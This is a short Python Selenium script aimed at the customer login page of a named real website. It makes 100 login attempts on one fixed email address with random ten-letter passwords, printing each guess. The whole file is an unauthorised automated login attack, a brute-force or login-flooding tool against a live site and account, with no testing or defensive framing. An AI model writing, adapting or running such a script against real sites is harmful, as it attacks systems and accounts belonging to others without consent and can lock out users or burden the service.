import time
import string
import random
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
driver = webdriver.Chrome()
driver.get("https://sepuls.cl/customer/login#")
time.sleep(5)
letters = string.ascii_lowercase
for x in range(100):
    usr = driver.find_element_by_id("customer_email")
    usr.clear()
    usr.send_keys("wigid99193@wawue.com")
    psw = driver.find_element_by_id("customer_password")
    str = ''.join(random.choice(letters) for i in range(10))
    psw.send_keys(str)
    print(str)
    clk = driver.find_element_by_xpath("//*[@id='submit_login']").click()